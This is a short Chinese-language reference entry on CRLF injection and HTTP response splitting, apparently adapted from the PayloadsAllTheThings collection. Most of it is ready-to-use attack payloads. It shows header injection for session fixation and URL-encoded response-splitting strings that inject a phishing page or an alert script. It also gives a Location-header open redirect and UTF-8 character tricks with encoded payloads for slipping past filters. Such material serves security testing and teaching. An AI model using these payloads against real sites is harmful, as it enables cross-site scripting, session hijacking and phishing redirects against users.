# CRLF Injection - CRLF注入

[SEARCH_KEYWORDS]
漏洞类型: CRLF Injection CRLF注入 HTTP Response Splitting HTTP响应拆分
攻击类型: XSS Session Fixation Cache Poisoning Open Redirect Header Injection
关键词: CR LF \r \n Carriage Return Line Feed 换行 回车
编码: %0D %0A %0d%0a \r\n
技术: Header Injection Response Splitting UTF-8 Bypass

[CONTENT]

## CRLF注入概述

CRLF注入是一种Web安全漏洞，当攻击者在应用程序中注入意外的回车(CR, \r)和换行(LF, \n)字符时发生。这些字符用于表示HTTP等网络协议中行的结束和新行的开始。

## CRLF字符

- `CR` (`\r`, ASCII 13): 将光标移动到行首
- `LF` (`\n`, ASCII 10): 将光标移动到下一行
- URL编码: `%0D` (CR), `%0A` (LF)

## 攻击类型

### Session Fixation (会话固定)

正常HTTP响应：

```http
HTTP/1.1 200 OK
Content-Type: text/html
Set-Cookie: sessionid=abc123
```

注入 `value\r\nSet-Cookie: admin=true`：

```http
HTTP/1.1 200 OK
Content-Type: text/html
Set-Cookie: sessionid=value
Set-Cookie: admin=true
```

### XSS攻击

注入新响应体：

```powershell
http://www.example.net/index.php?lang=en%0D%0AContent-Length%3A%200%0A%20%0AHTTP/1.1%20200%20OK%0AContent-Type%3A%20text/html%0ALast-Modified%3A%20Mon%2C%2027%20Oct%202060%2014%3A50%3A18%20GMT%0AContent-Length%3A%2034%0A%20%0A%3Chtml%3EYou%20have%20been%20Phished%3C/html%3E
```

禁用XSS保护并注入脚本：

```powershell
http://example.com/%0d%0aContent-Length:35%0d%0aX-XSS-Protection:0%0d%0a%0d%0a23%0d%0a<svg%20onload=alert(document.domain)>%0d%0a0%0d%0a/%2f%2e%2e
```

### Open Redirect (开放重定向)

```powershell
%0d%0aLocation:%20http://myweb.com
```

## 过滤器绕过

根据RFC 7230，HTTP头字段值应限制为US-ASCII字符。Firefox会剥离超出范围的字符。

### UTF-8字符绕过

| UTF-8字符 | Hex | Unicode | 转换为 |
|-----------|-----|---------|--------|
| 嘊 | %E5%98%8A | \u560a | %0A (\n) |
| 嘍 | %E5%98%8D | \u560d | %0D (\r) |
| 嘾 | %E5%98%BE | \u563e | %3E (>) |
| 嘼 | %E5%98%BC | \u563c | %3C (<) |

### 绕过Payload

```js
嘊嘍content-type:text/html嘊嘍location:嘊嘍嘊嘍嘼svg/onload=alert(document.domain()嘾
```

URL编码版本：

```text
%E5%98%8A%E5%98%8Dcontent-type:text/html%E5%98%8A%E5%98%8Dlocation:%E5%98%8A%E5%98%8D%E5%98%8A%E5%98%8D%E5%98%BCsvg/onload=alert%28document.domain%28%29%E5%98%BE
```

## 风险影响

- 跨站脚本(XSS)
- 缓存中毒
- 响应拆分
- 头部操纵

## 参考文档

原始来源: PayloadsAllTheThings/CRLF Injection/README.md